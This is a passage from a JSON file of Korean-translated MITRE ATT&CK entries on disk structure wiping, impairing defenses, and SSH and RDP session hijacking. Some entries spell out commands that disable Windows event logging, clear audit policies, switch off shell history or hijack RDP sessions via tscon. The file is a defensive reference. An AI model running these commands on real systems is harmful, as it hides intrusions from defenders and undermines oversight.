      "description": "공격자는 시스템 부팅에 필요한 하드 드라이브의 디스크 데이터 구조를 손상시키거나 삭제할 수 있습니다. 이는 특정 중요 시스템을 목표로 하거나 네트워크 내에서 대규모로 행하여 시스템 및 네트워크 자원의 가용성을 방해하는 방식입니다.\n\n공격자는 마스터 부트 레코드(MBR)나 파티션 테이블과 같은 구조에 위치한 중요한 데이터를 덮어써서 시스템을 부팅할 수 없게 만들려고 할 수 있습니다. (출처: Symantec Shamoon 2012)(출처: FireEye Shamoon Nov 2016)(출처: Palo Alto Shamoon Nov 2016)(출처: Kaspersky StoneDrill 2017)(출처: Unit 42 Shamoon3 2018) 디스크 구조에 포함된 데이터에는 운영 체제를 로드하기 위한 초기 실행 코드나 디스크 상의 파일 시스템 파티션의 위치가 포함될 수 있습니다. 이 정보가 없으면 컴퓨터는 부팅 과정에서 운영 체제를 로드할 수 없게 되어, 컴퓨터가 사용할 수 없는 상태가 됩니다. [디스크 구조 삭제](https://attack.mitre.org/techniques/T1561/002)는 단독으로 수행되거나, 디스크의 모든 섹터가 삭제되는 경우 [디스크 콘텐츠 삭제](https://attack.mitre.org/techniques/T1561/001)와 함께 수행될 수 있습니다.\n\n네트워크 장치에서는 공격자가 `format` 같은 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령을 사용하여 파일 시스템을 포맷할 수 있습니다. (출처: format_cmd_cisco)\n\n대상 조직에 대한 영향을 극대화하기 위해, 디스크 구조 파괴를 목적으로 설계된 악성 소프트웨어는 다른 기법인 [유효 계정](https://attack.mitre.org/techniques/T1078), [운영 체제 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003), [SMB/Windows 관리 공유](https://attack.mitre.org/techniques/T1021/002)와 같은 기법을 활용하여 네트워크를 통해 전파되는 웜과 같은 특성을 가질 수 있습니다. (출처: Symantec Shamoon 2012)(출처: FireEye Shamoon Nov 2016)(출처: Palo Alto Shamoon Nov 2016)(출처: Kaspersky StoneDrill 2017)",
      "external_id": "T1561.002",
      "modified": "2024-10-15T16:32:05.064Z",
      "title": "Disk Structure Wipe",
      "translated": true
    },
    {
      "description": "공격자는 피해자의 환경 내 구성 요소를 악의적으로 수정하여 방어 메커니즘을 방해하거나 비활성화할 수 있습니다. 이는 방화벽 및 안티바이러스와 같은 예방 방어를 저해하는 것뿐만 아니라, 방어자가 활동을 감사하고 악의적인 행동을 식별하는 데 사용할 수 있는 탐지 기능 또한 포함됩니다. 이러한 행위는 기본 방어뿐 아니라 사용자와 관리자가 설치한 보조 기능에도 해당됩니다.\n\n공격자는 또한 방어 위생에 기여하는 일상적인 작업을 방해할 수 있습니다. 예를 들어, 사용자가 로그아웃하는 것을 차단하거나 시스템 종료를 방지하거나 업데이트 프로세스를 비활성화하거나 수정하는 등의 방해가 포함됩니다. 공격자는 이벤트 집계 및 분석 메커니즘을 대상으로 하거나, 다른 시스템 구성 요소를 변경함으로써 이러한 절차를 방해할 수 있습니다. 이러한 제한은 악의적인 작업과 사건의 지속적인 전파를 더욱 용이하게 할 수 있습니다. (출처: Google Cloud Mandiant UNC3886 2024)(출처: Emotet 종료)",
      "external_id": "T1562",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Impair Defenses",
      "translated": true
    },
    {
      "description": "적대자는 자신의 악성코드/도구 및 활동이 탐지되지 않도록 보안 도구를 수정하거나 비활성화할 수 있습니다. 이는 보안 소프트웨어 프로세스나 서비스를 종료하거나, 도구가 제대로 작동하지 않도록 레지스트리 키 또는 구성 파일을 수정/삭제하는 형태로 이루어질 수 있으며, 보안 도구가 스캔하거나 정보를 보고하는 것을 방해하는 다른 방법을 사용할 수도 있습니다. 적대자는 최신 보안 패치가 피해자 시스템의 도구에 도달하는 것을 방지하기 위해 업데이트를 비활성화할 수도 있습니다. (출처: SCADAfence_ransomware)\n\n적대자는 또한 보안 도구에 의해 배포되고 사용되는 아티팩트를 조작할 수 있습니다. 보안 도구는 특정 이벤트에 대한 가시성을 유지하기 위해 시스템 구성 요소에 동적 변경을 가할 수 있습니다. 예를 들어, 보안 제품은 자체 모듈을 로드하거나 데이터를 수집하기 위해 프로세스에 의해 로드된 모듈을 수정할 수 있습니다. [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006)와 유사하게, 적대자는 탐지를 피하기 위해 도구에 의해 추가된 이러한 기능(특히 사용자 공간에서 존재하거나 적대자가 접근할 수 있는 가능성이 있는 기능)을 언훅하거나 수정할 수 있습니다. (출처: OutFlank System Calls)(출처: MDSec System Calls)\n\n적대자는 특정 애플리케이션, 예를 들어 Sysmon을 목표로 삼을 수도 있습니다. 예를 들어, <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code>의 \"Start\" 및 \"Enable\" 값을 수정하여 Sysmon 로깅을 방해하고 잠재적으로 비활성화할 수 있습니다. (출처: disable_win_evt_logging) \n\n네트워크 장치에서는, 적대자가 시작 구성 파일을 변경하여 디지털 서명 검증 확인을 우회하고 부팅 시 일반적으로 발생하는 펌웨어 검증을 효과적으로 비활성화하려고 시도할 수 있습니다. (출처: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(출처: Analysis of FG-IR-22-369)\n\n클라우드 환경에서는 적대자에 의해 비활성화된 도구에는 AWS CloudWatch 또는 Google Cloud Monitor와 같은 서비스에 보고하는 클라우드 모니터링 에이전트가 포함될 수 있습니다.\n\n더욱이, 방어 도구가 anti-tampering 메커니즘을 갖추고 있을지라도, 적대자는 합법적인 루트킷 제거 키트와 같은 도구를 악용하여 이러한 도구를 손상시키거나 비활성화할 수 있습니다. (출처: chasing_avaddon_ransomware)(출처: dharma_ransomware)(출처: demystifying_ryuk)(출처: doppelpaymer_crowdstrike) 예를 들어, 적대자는 GMER과 같은 도구를 사용하여 감염된 시스템에서 숨겨진 프로세스와 안티바이러스 소프트웨어를 찾아 종료하는 데 사용했습니다. (출처: demystifying_ryuk)\n\n또한, 적대자는 안티바이러스 소프트웨어의 합법적인 드라이버를 이용하여 커널 공간에 접근하여 (즉, [Privilege Escalation을 위한 Exploitation](https://attack.mitre.org/techniques/T1068)) 안티탐핑 기능을 우회할 수 있습니다. (출처: avoslocker_ransomware)",
      "external_id": "T1562.001",
      "modified": "2024-04-12T21:13:46.640Z",
      "title": "Disable or Modify Tools",
      "translated": true
    },
    {
      "description": "공격자는 탐지 및 감사에 활용할 수 있는 데이터를 제한하기 위해 Windows 이벤트 로깅을 비활성화할 수 있습니다. Windows 이벤트 로그는 로그인 시도, 프로세스 생성 등의 사용자 및 시스템 활동을 기록합니다. (출처: Windows Log Events) 이 데이터는 보안 도구와 분석가들이 탐지를 생성하는 데 사용됩니다.\n\nEventLog 서비스는 다양한 시스템 구성 요소 및 애플리케이션의 이벤트 로그를 유지 관리합니다. (출처: EventLog_Core_Technologies) 기본적으로 이 서비스는 시스템이 시작될 때 자동으로 시작됩니다. 감사 정책은 로컬 보안 정책(secpol.msc)에서 유지 관리되며, EventLog 서비스가 기록할 시스템 이벤트를 정의합니다. 보안 감사 정책 설정은 secpol.msc를 실행한 후 <code>보안 설정\\로컬 정책\\감사 정책</code>으로 이동하여 기본 감사 정책 설정을 변경하거나 <code>보안 설정\\고급 감사 정책 구성</code>에서 고급 감사 정책을 변경할 수 있습니다. (출처: Audit_Policy_Microsoft)(출처: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code>도 감사 정책을 설정하는 데 사용할 수 있습니다. (출처: auditpol)\n\n공격자는 시스템 전체 로깅을 대상으로 하거나 특정 애플리케이션의 로깅을 대상할 수 있습니다. 예를 들어, Windows EventLog 서비스는 <code>Set-Service -Name EventLog -Status Stopped</code> 또는 <code>sc config eventlog start=disabled</code> 명령을 사용하여 비활성화할 수 있으며, 이후 <code>Stop-Service  -Name EventLog</code> 명령을 사용하여 서비스를 수동으로 중지합니다. (출처: Disable_Win_Event_Logging)(출처: disable_win_evt_logging) 추가로, “Start” 값을 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code>에서 수정한 후 시스템을 재시작하여 변경 사항을 적용할 수 있습니다. (출처: disable_win_evt_logging)\n\n레지스트리 키 수정을 통해 EventLog 서비스를 비활성화하는 방법에는 여러 가지가 있습니다. 첫째로, 관리자 권한 없이 공격자는 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>에서 \"Start\" 값을 수정한 후 시스템을 재부팅하여 보안 이벤트 로그를 비활성화할 수 있습니다. (출처: winser19_file_overwrite_bug_twitter) 둘째로, 관리자 권한을 가진 공격자는 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> 및 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code>의 동일한 값을 수정하여 전체 EventLog를 비활성화할 수 있습니다. (출처: disable_win_evt_logging)\n\n추가적으로, 공격자는 명령 프롬프트에서 <code>auditpol</code> 및 그 하위 명령을 사용하여 감사를 비활성화하거나 감사 정책을 지울 수 있습니다. 특정 설정이나 감사 카테고리를 활성화 또는 비활성화하기 위해 공격자는 <code>/success</code> 또는 <code>/failure</code> 매개변수를 사용할 수 있습니다. 예를 들어, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code>는 계정 로그인 카테고리에 대한 감사를 끕니다. (출처: auditpol.exe_STRONTIC)(출처: T1562.002_redcanaryco) 감사 정책을 지우기 위해 공격자는 다음과 같은 명령을 실행할 수 있습니다: <code>auditpol /clear /y</code> 또는 <code>auditpol /remove /allusers</code>. (출처: T1562.002_redcanaryco)\n\nWindows 이벤트 로깅을 비활성화함으로써 공격자는 침해의 증거를 덜 남기고 활동할 수 있습니다.",
      "external_id": "T1562.002",
      "modified": "2023-09-18T22:33:57.556Z",
      "title": "Disable Windows Event Logging",
      "translated": true
    },
    {
      "description": "적대자는 손상된 시스템에서 실행한 명령어를 숨기기 위해 명령어 이력 로깅을 방해할 수 있습니다. 다양한 명령어 해석기는 사용자가 터미널에 입력한 명령어를 기록하여 사용자가 자신이 수행한 작업을 되짚어 볼 수 있도록 합니다.\n\nLinux 및 macOS에서 명령어 이력은 환경 변수 <code>HISTFILE</code>가 지정하는 파일에 저장됩니다. 사용자가 시스템에서 로그아웃할 때 이 정보는 사용자의 홈 디렉터리에 있는 <code>~/.bash_history</code>라는 파일로 플러시됩니다. <code>HISTCONTROL</code> 환경 변수는 사용자가 로그아웃할 때 <code>history</code> 명령어에 의해 저장되어야 할 내용을 추적합니다. macOS에서는 기본적으로 <code>HISTCONTROL</code>가 존재하지 않지만 사용자가 설정할 수 있으며 이는 적용됩니다.\n\n적대자는 이력 환경 변수를 지우거나 (<code>unset HISTFILE</code>) 명령어 이력 크기를 0으로 설정하여 (<code>export HISTFILESIZE=0</code>) 명령어 로깅을 방지할 수 있습니다. 또한, <code>HISTCONTROL</code>을 설정하여 공백으로 시작하는 명령어를 무시하도록 할 수 있습니다. <code>HISTCONTROL</code>은 중복 명령어를 무시하도록 설정할 수도 있습니다. 일부 Linux 시스템에서는 기본적으로 \"ignoreboth\"로 설정되어 있어 이전 두 가지 예를 모두 포함합니다. 이는 “ ls”는 저장되지 않고, “ls”는 이력에 저장된다는 의미입니다. 적대자는 모든 터미널 명령 앞에 공백을 추가하여 흔적을 남기지 않고 작동할 수 있습니다.\n\nWindows 시스템에서는 <code>PSReadLine</code> 모듈이 모든 PowerShell 세션에서 사용된 명령어를 추적하고 기본적으로 <code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> 파일에 기록합니다. 적대자는 <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>를 사용하여 이러한 로그가 저장되는 위치를 변경할 수 있습니다. 이렇게 하면 <code>ConsoleHost_history.txt</code>가 로그를 받지 않게 됩니다. 또한 PowerShell 명령어 <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>을 사용하여 이 파일로의 로깅을 끌 수도 있습니다. (출처: Microsoft PowerShell Command History)(출처: Sophos PowerShell command audit)(출처: Sophos PowerShell Command History Forensics)\n\n적대자는 또한 네트워크 장치의 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008)를 활용하여 명령어 이력 로깅을 비활성화할 수 있습니다 (예: <code>no logging</code>).",
      "external_id": "T1562.003",
      "modified": "2023-03-30T21:01:47.940Z",
      "title": "Impair Command History Logging",
      "translated": true
    },
    {
      "description": "적대 세력은 네트워크 사용을 제한하는 제어 방식을 우회하기 위해 시스템 방화벽을 비활성화하거나 수정할 수 있습니다. 변경 사항에는 전체 메커니즘을 비활성화하거나 특정 규칙을 추가, 삭제 또는 수정하는 것이 포함될 수 있습니다. 이는 운영 체제에 따라 여러 가지 방법으로 수행될 수 있으며, 여기에는 명령 프롬프트를 통한 방법, Windows 레지스트리 키 수정, Windows 제어판 사용 등이 포함됩니다.\n\n시스템 방화벽을 수정하거나 비활성화하면 적대 세력이 C2(명령 및 제어) 통신, 수평 이동, 또는 데이터 유출을 가능하게 만들 수 있으며, 이러한 행위는 일반적으로 허용되지 않습니다. 예를 들어, 적대 세력은 비 전통적이고 잠재적으로 보안성이 덜한 포트(예: [비표준 포트](https://attack.mitre.org/techniques/T1571))를 사용하여 잘 알려진 프로토콜(예: RDP)에 대한 새로운 방화벽 규칙을 추가할 수 있습니다. (출처: change_rdp_port_conti)\n\n또한, 적대 세력은 시스템 방화벽에 간접적으로 영향을 미치는 호스트 네트워크 설정(예: 인터페이스 대역폭 또는 네트워크 연결 요청 임계값)을 수정할 수 있습니다. (출처: Huntress BlackCat) 다양한 [원격 서비스](https://attack.mitre.org/techniques/T1021)의 남용을 활성화하는 것과 관련된 설정 역시 방화벽 규칙을 간접적으로 수정할 수 있습니다.",
      "external_id": "T1562.004",
      "modified": "2024-09-12T19:37:57.867Z",
      "title": "Disable or Modify System Firewall",
      "translated": true
    },
    {
      "description": "적대자는 센서가 수집하고 분석하는 전형적인 지표 또는 사건을 차단하려고 시도할 수 있습니다. 이는 악의적으로 리디렉션(Citation: Microsoft Lamin Sept 2017)하거나 Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018)와 같은 호스트 기반 센서를 비활성화하는 것을 포함할 수 있으며, 이벤트 텔레메트리 수집 및 흐름을 제어하는 설정을 조작하여 이루어집니다.(Citation: Medium Event Tracing Tampering 2018) 이러한 설정은 구성 파일 및/또는 레지스트리에 저장될 수 있으며, [PowerShell](https://attack.mitre.org/techniques/T1059/001)이나 [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)와 같은 관리 유틸리티를 통해 접근 가능합니다.\n\n예를 들어, 적대자는 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code>의 `File` 값을 수정하여 새로운 또는 다른 .evtx 로그 파일에 악의적인 행동을 숨길 수 있습니다. 이 작업은 시스템 재부팅을 필요로 하지 않으며 즉시 효과를 나타냅니다.(Citation: disable_win_evt_logging)\n\nETW 중단은 여러 방법으로 달성될 수 있지만, 가장 직접적인 방법은 [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet을 사용하거나 레지스트리와 직접 인터페이스하여 변경하는 것입니다.\n\n네트워크 기반의 지표 보고의 경우, 적대자는 중앙 분석을 방지하기 위해 보고와 관련된 트래픽을 차단할 수 있습니다. 이는 텔레메트리를 전달하는 책임이 있는 로컬 프로세스를 중지하거나 이벤트 집합을 담당하는 특정 호스트로의 트래픽을 차단하기 위해 호스트 기반 방화벽 규칙을 생성하는 등의 방법으로 이루어질 수 있습니다. 이러한 호스트는 보안 정보 및 이벤트 관리(SIEM) 제품과 같은 역할을 합니다.\n\n리눅스 환경에서 적대자는 syslog나 nxlog와 같은 로그 처리 도구를 비활성화하거나 재구성하여 탐지 및 모니터링 기능을 저해하고 후속 행동을 용이하게 할 수 있습니다 (Citation: LemonDuck).",
      "external_id": "T1562.006",
      "modified": "2024-02-14T21:50:32.531Z",
      "title": "Indicator Blocking",
      "translated": true
    },
    {
      "description": "적대자는 클라우드 환경 내에서 방화벽을 비활성화하거나 수정하여 클라우드 리소스에 대한 접근을 제한하는 제어 장치를 우회할 수 있습니다. 클라우드 방화벽은 [시스템 방화벽 비활성화 또는 수정하기](https://attack.mitre.org/techniques/T1562/004)에서 설명된 시스템 방화벽과는 별개입니다.\n\n클라우드 환경에서는 일반적으로 신뢰할 수 있는 IP 주소에서 예상되는 포트와 프로토콜을 통해 네트워크 활동만 허용하는 제한적인 보안 그룹과 방화벽 규칙을 활용합니다. 적절한 권한을 가진 적대자는 피해자의 클라우드 환경에 대한 접근을 허용하기 위해 새로운 방화벽 규칙이나 정책을 도입하거나 클라우드 제어 평면에서 데이터 평면으로의 측면 이동을 할 수 있습니다. 예를 들어, 적대자는 클라우드 호스팅 인스턴스에 대한 TCP/IP 연결을 허용하기 위해 기존 보안 그룹에 새로운 수신 규칙을 생성하거나 완전히 새로운 보안 그룹을 만들기 위해 스크립트나 유틸리티를 사용할 수 있습니다.(인용: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) 또한, 악성 활동(예: 암호화폐 채굴)과 관련된 트래픽을 지원하기 위해 네트워킹 제한을 제거할 수도 있습니다.(인용: Expel IO Evil in AWS)(인용: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\n클라우드 방화벽을 수정하거나 비활성화하면 적대자의 C2 통신, 측면 이동 및/또는 데이터 유출이 가능해지며, 그렇지 않으면 허용되지 않을 수 있습니다. 또한, [무차별 대입 공격](https://attack.mitre.org/techniques/T1110) 또는 [엔드포인트 서비스 거부 공격](https://attack.mitre.org/techniques/T1499)을 수행하기 위해 자원을 개방하는 데에도 사용될 수 있습니다.",
      "external_id": "T1562.007",
      "modified": "2024-10-16T19:38:57.374Z",
      "title": "Disable or Modify Cloud Firewall",
      "translated": true
    },
    {
      "description": "적대자는 클라우드 로깅 기능과 통합을 비활성화하거나 수정하여 자신의 활동에 대한 데이터를 수집하는 것을 제한하고 탐지를 피할 수 있습니다. 클라우드 환경에서는 감사 및 응용 프로그램 로그를 수집하고 분석하여 사용자가 환경 내에서 수행하는 활동에 대한 통찰력을 제공합니다. 적대자가 충분한 권한을 가지고 있는 경우, 자신의 활동을 감지하지 못하도록 로깅을 비활성화하거나 수정할 수 있습니다.\n\n예를 들어, AWS에서는 적대자가 추가적인 악의적 활동을 수행하기 전에 CloudWatch/CloudTrail 통합을 비활성화할 수 있습니다. (출처: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) 또한 로그 기능을 조작할 수 있는데, 예를 들어 관련된 SNS 주제를 제거하거나, 다중 리전 로깅을 비활성화하거나, 로그 파일을 검증 및/또는 암호화하는 설정을 비활성화하는 것입니다. (출처: AWS Update Trail)(출처: Pacu Detection Disruption Module) Office 365에서는 적대자가 `Set-MailboxAuditBypassAssociation` cmdlet을 사용하거나, 사용자의 M365 고급 감사 기능을 비활성화하거나, 사용자의 라이센스를 엔터프라이즈 E5에서 엔터프라이즈 E3로 다운그레이드하여 특정 사용자의 메일 수집 활동에 대한 로깅을 비활성화할 수 있습니다. (출처: Dark Reading Microsoft 365 Attacks 2021)",
      "external_id": "T1562.008",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Disable or Modify Cloud Logs",
      "translated": true
    },
    {
      "description": "위협 행위자는 Windows 안전 모드를 악용하여 엔드포인트 방어를 비활성화할 수 있습니다. 안전 모드는 제한된 드라이버 및 서비스 집합으로 Windows 운영 체제를 시작합니다. 엔드포인트 탐지 및 대응(EDR) 도구와 같은 타사 보안 소프트웨어는 안전 모드에서 Windows를 부팅한 후 시작되지 않을 수 있습니다. 안전 모드는 일반 안전 모드와 네트워킹을 통한 안전 모드의 두 가지 버전이 있습니다. 안전 모드 부팅 후 추가 서비스를 시작하는 것이 가능합니다.(참고: Microsoft 안전 모드)(참고: Sophos Snatch 랜섬웨어 2019)\n\n위협 행위자는 제한된 부팅으로 시작되지 않을 수 있는 엔드포인트 방어를 비활성화하기 위해 안전 모드를 악용할 수 있습니다. 호스트는 부팅 응용 프로그램 설정을 관리하는 파일인 부트 구성 데이터(BCD) 저장소를 수정하여 다음 재부팅 후 안전 모드로 강제 전환될 수 있습니다.(참고: Microsoft bcdedit 2021)\n\n또한, 위협 행위자는 관련 레지스트리 값을 수정하여 안전 모드에서 시작되는 최소 서비스 목록에 악성 응용 프로그램을 추가할 수 있습니다(즉, [레지스트리 수정](https://attack.mitre.org/techniques/T1112)). 악성 [구성 요소 개체 모델](https://attack.mitre.org/techniques/T1559/001)(COM) 객체도 안전 모드에서 등록되고 로드될 수 있습니다.(참고: Sophos Snatch 랜섬웨어 2019)(참고: CyberArk Labs 안전 모드 2016)(참고: Cybereason Nocturnus MedusaLocker 2020)(참고: BleepingComputer REvil 2021)",
      "external_id": "T1562.009",
      "modified": "2021-08-31T14:51:47.352Z",
      "title": "Safe Mode Boot",
      "translated": true
    },
    {
      "description": "위협 행위자는 시스템 기능의 구버전 또는 취약하고 업데이트된 보안 제어를 지원하지 않는 버전을 강제로 사용할 수 있습니다. 다운그레이드 공격은 일반적으로 시스템의 이전 호환성을 이용하여 덜 안전한 작업 모드로 강제 전환합니다. \n\n위협 행위자는 [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) 또는 악용하여 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) 또는 [Network Sniffing](https://attack.mitre.org/techniques/T1040)을 활성화할 수 있는 다양한 덜 안전한 시스템 기능 버전을 사용할 수 있습니다. 예를 들어, PowerShell 버전 5 이상은 실행된 스크립트 내용을 기록할 수 있는 스크립트 블록 로깅(SBL)을 포함합니다. 그러나 위협 행위자는 SBL을 지원하지 않는 이전 버전의 PowerShell을 실행하여 [Impair Defenses](https://attack.mitre.org/techniques/T1562)를 시도하면서 감지될 수 있는 악성 스크립트를 실행하려 할 수 있습니다.\n\n유사하게, 위협 행위자는 네트워크 트래픽을 목표로 하여 암호화된 HTTPS 연결에서 보안되지 않은 HTTP 연결로 다운그레이드하여 네트워크 데이터를 평문으로 노출할 수 있습니다.",
      "external_id": "T1562.010",
      "modified": "2023-10-03T16:40:15.445Z",
      "title": "Downgrade Attack",
      "translated": true
    },
    {
      "description": "대적자는 보안 경고를 속여 악성 활동에 대한 방어자의 인식을 저하시킬 수 있는 가짜 증거를 제시할 수 있습니다. (출처: BlackBasta) 방어 도구에서 생성된 메시지는 잠재적인 보안 사건에 대한 정보와 보안 소프트웨어 및 시스템의 작동 상태에 대한 정보를 포함합니다. 보안 보고 메시지는 시스템의 정상 운영을 모니터링하고 보안 사고를 신호할 수 있는 중요한 이벤트를 식별하는 데 중요합니다.\n\n[지표 차단](https://attack.mitre.org/techniques/T1562/006) 대신 또는 그 추가로, 대적자는 합법적인 보안 도구가 비활성화된 후에도 보안 도구가 계속 작동하고 있다는 긍정적인 확인을 가장할 수 있습니다 (예: [도구 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/001)). 대적자는 감염 후에도 \"건강한\" 시스템 상태를 나타낼 수도 있습니다. 이는 방어자의 반응을 지연시켜 더 많은 악성 활동을 가능하게 하는 데 악용될 수 있습니다.\n\n예를 들어, 대적자는 Windows Defender 및 기타 시스템 도구가 비활성화된 후 \"건강한\" 시스템 상태를 표시하는 가짜 Windows 보안 GUI 및 트레이 아이콘을 나타낼 수 있습니다. (출처: BlackBasta)",
      "external_id": "T1562.011",
      "modified": "2024-10-16T20:12:44.962Z",
      "title": "Spoof Security Alerting",
      "translated": true
    },
    {
      "description": "공격자는 악의적인 활동을 숨기고 탐지를 피하기 위해 리눅스 감사 시스템을 비활성화하거나 수정할 수 있습니다. 리눅스 관리자는 리눅스 감사 시스템을 사용하여 시스템의 보안 관련 정보를 추적합니다. 리눅스 감사 시스템은 커널 레벨에서 작동하며, 사전 구성된 규칙에 따라 프로세스, 네트워크, 파일 및 로그인 이벤트와 같은 애플리케이션 및 시스템 활동에 대한 이벤트 로그를 유지합니다.\n\n일반적으로 `auditd`라고 불리는 이것은 이벤트를 디스크에 기록하는 데몬의 이름이며, `audit.conf` 구성 파일에 설정된 매개변수에 의해 관리됩니다. 로그 생성 규칙을 구성하는 주된 두 가지 방법은 명령줄 유틸리티인 `auditctl`을 통해서와 부팅 시 로드되는 `auditctl` 명령의 시퀀스를 포함하는 파일 `/etc/audit/audit.rules`를 통해서입니다. (자료출처: Red Hat 시스템 감사)(자료출처: IzyKnows auditd 위협 감지 2022)\n\n루트 권한을 갖춘 공격자는 감사 시스템 서비스를 비활성화하거나 구성/규칙 파일을 편집하거나 감사 시스템 라이브러리 함수를 후킹함으로써 자신의 활동이 기록되지 않도록 할 수 있습니다. 명령줄을 사용하여 공격자는 `auditd` 데몬과 관련된 프로세스를 종료하거나 `systemctl`을 사용하여 감사 서비스 중지를 통해 감사 시스템 서비스를 비활성화할 수 있습니다. 공격자는 또한 감사 시스템 기능을 후킹하여 로깅을 비활성화하거나 `/etc/audit/audit.rules` 또는 `audit.conf` 파일에 포함된 규칙을 수정하여 악의적인 활동을 무시하도록 설정할 수 있습니다. (자료출처: Trustwave Honeypot SkidMap 2023)(자료출처: ESET Ebury 2014년 2월)",
      "external_id": "T1562.012",
      "modified": "2023-10-03T03:44:46.935Z",
      "title": "Disable or Modify Linux Audit System",
      "translated": true
    },
    {
      "description": "공격자는 원격 서비스의 기존 세션을 장악하여 환경 내에서 수평 이동을 할 수 있습니다. 사용자는 telnet, SSH, RDP와 같이 원격 연결을 수용하도록 특별히 설계된 서비스에 정당한 자격 증명을 사용하여 로그인할 수 있습니다. 사용자가 서비스에 로그인하면 해당 서비스와 지속적인 상호작용을 유지할 수 있는 세션이 설정됩니다.\n\n공격자는 이러한 세션을 장악하여 원격 시스템에서 작업을 수행할 수 있습니다. [원격 서비스 세션 하이재킹](https://attack.mitre.org/techniques/T1563)은 [원격 서비스](https://attack.mitre.org/techniques/T1021)의 사용과는 다릅니다. 원격 서비스 세션 하이재킹은 ‘유효한 계정’([Valid Accounts](https://attack.mitre.org/techniques/T1078))을 사용하여 새로운 세션을 생성하는 대신, 기존 세션을 탈취하기 때문입니다. (출처: RDP 하이재킹 미디엄)(출처: 침해 후 검토 SSH 하이재킹)",
      "external_id": "T1563",
      "modified": "2024-02-26T14:21:37.818Z",
      "title": "Remote Service Session Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 합법적인 사용자의 SSH 세션을 하이재킹하여 환경 내에서 수평 이동을 할 수 있습니다. Secure Shell (SSH)는 Linux 및 macOS 시스템에서 원격 액세스의 표준 방법입니다. 이는 사용자가 암호화된 터널을 통해 다른 시스템에 연결할 수 있도록 하며, 일반적으로 비밀번호, 인증서 또는 비대칭 암호화 키 쌍을 통해 인증합니다.\n\n공격자는 타협된 호스트에서 수평 이동을 하기 위해, 활성 SSH 세션에서 공개 키 인증을 통해 다른 시스템과 설정된 신뢰 관계를 활용하여 기존의 다른 시스템에 대한 연결을 하이재킹할 수 있습니다. 이는 SSH 에이전트 자체를 타협하거나 에이전트의 소켓에 접근함으로써 이루어질 수 있습니다. 만약 공격자가 루트 접근 권한을 얻는다면, SSH 세션을 하이재킹하는 것은 상당히 간단할 것입니다. (인용: Slideshare SSH 악용) (인용: SSHjack Blackhat) (인용: Clockwork SSH 에이전트 하이재킹) (인용: Breach Post-mortem SSH 하이재킹)\n\n[SSH 하이재킹](https://attack.mitre.org/techniques/T1563/001)은 [SSH](https://attack.mitre.org/techniques/T1021/004)의 사용과는 다릅니다. SSH 하이재킹은 새로운 세션을 생성하는 것이 아니라 기존의 SSH 세션을 하이재킹하기 때문입니다. 이는 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 통해 이루어집니다.",
      "external_id": "T1563.001",
      "modified": "2020-03-23T23:11:24.682Z",
      "title": "SSH Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 합법적인 사용자의 원격 데스크톱 세션을 가로채어 환경 내에서 수평 이동을 할 수 있습니다. 원격 데스크톱은 운영 체제에서 일반적으로 제공되는 기능으로, 사용자가 원격 시스템의 시스템 데스크톱 그래픽 사용자 인터페이스에서 대화형 세션에 로그인할 수 있게 해줍니다. 마이크로소프트는 원격 데스크톱 프로토콜(RDP)의 구현을 원격 데스크톱 서비스(RDS)라고 부릅니다.(출처: TechNet Remote Desktop Services)\n\n공격자는 RDP 세션 가로채기를 수행할 수 있으며, 이는 합법적인 사용자의 원격 세션을 도용하는 것을 포함합니다. 일반적으로 다른 사람이 자신의 세션을 도용하려 할 경우 사용자는 알림을 받습니다. 시스템 권한과 터미널 서비스 콘솔을 사용하여 `c:\\windows\\system32\\tscon.exe [가로챌 세션 번호]` 명령을 실행하면, 공격자는 사용자에게 자격 증명이나 프롬프트 없이 세션을 가로챌 수 있습니다.(출처: RDP Hijacking Korznikov) 이는 원격 또는 로컬에서, 그리고 활성 세션 또는 연결 해제된 세션 모두에서 가능할 수 있습니다.(출처: RDP Hijacking Medium) 또한 도메인 관리자 또는 그 이상 권한을 가진 계정 세션을 도용하여 [원격 시스템 검색](https://attack.mitre.org/techniques/T1018) 및 권한 상승으로 이어질 수 있습니다. 이는 모두 네이티브 윈도우 명령을 사용하여 수행될 수 있지만, 레드 팀 도구에 기능으로 추가되기도 했습니다.(출처: Kali Redsnarf)",
      "external_id": "T1563.002",
      "modified": "2023-08-14T15:37:02.771Z",
      "title": "RDP Hijacking",
      "translated": true
    },
    {
